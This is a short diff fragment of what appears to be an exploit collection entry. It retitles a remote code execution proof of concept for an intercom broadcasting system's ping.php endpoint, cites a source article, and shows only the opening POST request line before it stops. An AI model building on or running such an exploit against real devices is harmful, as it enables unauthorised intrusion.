@@ -1,4 +1,4 @@
-# hikiv_Intercom_Broadcasting_rce
+# hikiv_Intercom_Broadcasting_ping.php_rce
 from : https://mp.weixin.qq.com/s/ijQtIMqgdLjla1GuTuO28w
 ```
 POST /php/ping.php HTTP/1.1
